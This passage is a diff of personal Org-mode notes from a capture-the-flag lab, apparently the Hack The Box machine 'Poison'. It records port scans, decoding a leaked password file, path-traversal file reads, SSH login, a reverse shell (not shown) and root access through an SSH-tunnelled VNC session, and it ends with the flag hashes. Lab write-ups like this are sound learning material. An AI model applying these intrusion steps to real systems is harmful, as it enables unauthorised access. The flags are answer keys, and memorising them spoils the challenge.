+5902/tcp open  vnc     VNC (protocol 3.8)
+| vnc-info: 
+|   Protocol version: 3.8
+|   Security types: 
+|     VNC Authentication (2)
+|     Tight (16)
+|   Tight auth subtypes: 
+|_    STDV VNCAUTH_ (2)
+5903/tcp open  vnc     VNC (protocol 3.8)
+| vnc-info: 
+|   Protocol version: 3.8
+|   Security types: 
+|     VNC Authentication (2)
+|     Tight (16)
+|   Tight auth subtypes: 
+|_    STDV VNCAUTH_ (2)
+5904/tcp open  vnc     VNC (protocol 3.8)
+| vnc-info:
+|   Protocol version: 3.8
+|   Security types:
+|     VNC Authentication (2)
+|     Tight (16)
+|   Tight auth subtypes:
+|_    STDV VNCAUTH_ (2)
+
+6002/tcp open  X11:2?
+6003/tcp open  X11     (access denied)
+Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 200.77 seconds
+    #+end_example
+
+** web server enumeration
+   [2018-05-05 sab 10:08] 
+   
+   Apparently you can execute various php scripts on the server by
+   typing their name.
+
+   Typing ~listfiles.php~ you get a list of other files. Among these
+   there are two that are not listed in the initial page. These are
+   ~browse.php~ and ~pwdbackup.txt~.
+
+   Opening ~pwdbackup.txt~ you find some password that has been encoded,
+   probably in base64, a couple or more times (it explicitly says in
+   the file that the password has been encoded like 13 times or so).
+
+   Should probably write a bash script that keeps decoding it until i
+   find something that is not base64.
+** decoding pwdbackup.txt
+   [2018-05-05 sab 14:00]
+
+   After some time i've managed to write a simple sh script that would
+   keep decoding the passwd untill something came out. Something did
+   come out, on the 13-th iteration, and that something is
+
+   ~Charix!2#4%6&8(0~
+
+   So this must be a password for something. Maybe ssh?
+** is the password correct?
+   [2018-05-05 sab 17:07]
+
+   Maybe the password ~Charix!2#4%6&8(0~ is not fully decoded.
+   
+   #+begin_example
+Charix!2#4%6&8(0
+1234567890
+   #+end_example
+   
+   Maybe the first portion is the username and the remaining portion
+   is the actual password.
+** found vnc ports
+   [2018-05-05 sab 19:25]
+
+   No idea how to proceed from here.
+
+   I actually did another scan with nmap and found other ports
+   open. Specifically two of them (~5902~ and ~5903~) use a protocol
+   called ~VNC~ (Virtual Network Computing). I downloaded a client for
+   connecting to a server with this port open but I still need a
+   password, and the password I've found doesn't seem to work.
+
+   Also another web server is up on port ~5802~. It says ~Bacula http
+   config~, but no idea what that means.
+
+   Finally, ports ~6002~ and ~6003~ are also open with ~X11~. Which, once
+   again, got no idea what it means.
+** found LFI
+   [2018-05-05 sab 23:06]
+   
+   Apparently we can use the search to open files in the file
+   system. For example ~../../../etc/php.ini~ Will open the file
+   situated in ~/usr/local/etc/php.ini~
+
+   When i try to open ~../../../../../home/charix~ it says Permission
+   denied.
+** got in with ssh
+   [2018-05-05 sab 23:34]
+
+   Ok i got in. The username was actually ~charix~, and not Charix. The
+   password was the one found in the pwdbackup.txt, that is,
+   ~Charix!2#4%6&8(0~.
+
+   Found the user flag, now will try to go into privilege escalation.
+** no clue on priv esc
+   [2018-05-06 dom 00:39]
+
+   Still got no clue on priv. esc. Maybe it has something to do with
+   the ~secret.zip~ file. Dunno how to use it though.
+     
+   Also maybe it has something to do with vnc.
+** maybe vnc?
+   [2018-05-06 dom 20:13]
+
+   I think the way to get root privilege is to log in with a vnc
+   client to a particular port opened by the server.
+
+   This reasoning comes from the fact that i found the following
+   process by doing ps aux:
+
+   #+begin_example
+ root  529  0.0  0.9  23620  8964  v0-  I  19:41  0:00.06  Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc    
+   #+end_example
+
+   Now, the problem is: which port is this listening on? And, even if
+   I find the port, whats the password? Maybe the one contained in the
+   secret.zip file?
+
+   Running ~sockstat~ we get, among other things
+
+   #+begin_example
+root     sshd       620   4  tcp4   *:22                  *:*
+root     twm        541   3  stream -> /tmp/.X11-unix/X1
+root     xterm      540   3  stream -> /tmp/.X11-unix/X1
+root     Xvnc       529   0  stream /tmp/.X11-unix/X1
+root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
+root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
+root     Xvnc       529   4  stream /tmp/.X11-unix/X1
+root     Xvnc       529   5  stream /tmp/.X11-unix/X1   
+   #+end_example
+
+   Thus we can see that root has opened ports ~5901~ and ~5801~ or
+   something for ~Xvnc~. The problem is, I think, that the ports are
+   only accepting local connections or something.
+** still no clue
+   [2018-05-06 dom 21:03]
+
+   Still no idea. However, by putting a php script in the ~./tmp folder~
+   and executing it from the brower, I managed to open a reverse shell
+   and get inside the machine as the user ~www~. Still, this doesn't
+   really help much.
+** stuck
+   [2018-05-06 dom 22:32]
+
+   Stuck. No idea how to use the ~secret.zip~ file.
+
+   This comment on the forum says that the unzipped file is needed to
+   do something. However i still have no idea on what this something
+   is.
+
+   How can we use a file that we cannot read? HMMMM, i think that the
+   secret files contains the password needed to access the vnc port
+   that was opened by root (mentioned before). However to do this i
+   need a program called ~vncviewer~.
+** ssh tunneling
+   [2018-05-07 lun 18:37]
+
+   Man, I don't know what's up today but the machine keeps going down
+   every 2-3 min. Like, fuck, can't do shit.
+
+   Anyways, I think I know what I'm supposed to do. That is, I'm
+   supposed to use the fact that root has opened a vnc port. However,
+   i have no idea on how to do that.
+     
+   HMMMMMMMMMMMMM, I've been reading
+   https://www.cl.cam.ac.uk/research/dtg/attarchive/vnc/sshvnc.html
+   and here it says:
+   
+   #+begin_quote
+   [...] However, SSH has some nice extra tricks up its sleeve.  You
+   can also request that it listens on a particular port on your local
+   machine, and forwards that down the secure connection to a port on
+   a machine at the other end.  For example,
+
+   ssh -L x:localhost:y snoopy
+
+   means "Start an SSH connection to snoopy, and also listen on port x
+   on my machine, and forward any connections there to port y on
+   snoopy." [...]
+   #+end_quote
+
+   Does this mean that we can access the machine locally with ssh and
+   the charix user account. Once we have a shell there, we can
+   re-direct the traffic going from port 5901 (which i think is the
+   port where root has opened a vncserver), to some port y on our own
+   machine.
+
+   Reading againt from the link:
+
+   #+begin_quote
+   [...] imagine you had a VNC server running as display :1 on machine
+   snoopy, and you wanted a secure connection to it from your local
+   machine.  You could start the ssh session using:
+
+   ssh -L 5902:localhost:5901 snoopy   
+   #+end_quote
+** got root!
+   [2018-05-07 lun 18:57]
+
+   Ok somehow the previous idea worked and managed to get root
+   flag. However, i still have no idea how it all worked. What i did
+   was the following:
+   
+   #+begin_src sh
+ssh -L 5902:localhost:5901 charix@10.10.10.84
+vncviewer -passwd secret localhost:5902
+   #+end_src
+     
+   Now, i wonder, was the first ssh login necessary? I think it was
+   because root started the vnc display listening locally, with IP
+   ~127.0.0.1~. Therefore, if I simply did
+   
+   #+begin_src sh
+vncviewer -passwd secret 10.10.10.84:5902   
+   #+end_src
+     
+   It would not have sent the login request to the same socket, since
+   the socket socket i wanted had local address ~127.0.0.1~, and not
+   ~10.10.10.84~. By re-directing the traffic from my ~5902~ localhost
+   port through charix's ~5901~ port i was able to connect to the local
+   address ~127.0.0.1~ on the remote machine.
+     
+   If this machine did not go down every 3 min I would've tried this.
+     
+   @@html: <hr style="border: 1px solid #A1283B;" />@@
+
+* Flags                                                            :noexport:
+  - *user*: eaacdfb2d141b72a589233063604209c
+  - *root*: 716d04b188419cf2bb99d891272361f5
